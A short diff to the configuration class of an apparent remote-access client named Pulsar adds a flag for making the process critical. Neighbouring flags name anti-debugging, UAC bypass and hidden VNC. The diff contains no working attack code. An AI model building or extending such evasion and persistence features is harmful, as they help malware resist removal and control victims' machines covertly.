@@ -43,6 +43,7 @@ namespace Pulsar.Client.Config
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
         public static bool UACBYPASS = false;
+        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
 
         // needed for hvnc
         public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
@@ -81,6 +82,7 @@ namespace Pulsar.Client.Config
         public static bool ANTIDEBUG = false;
         public static bool PASTEBIN = false;
         public static bool UACBYPASS = false;
+        public static bool MAKEPROCESSCRITICAL = false; // if true it will attempt to make the process crititcal (needs admin fr)
 
         // needed for hvnc
         public static IntPtr OriginalDesktopPointer = IntPtr.Zero;
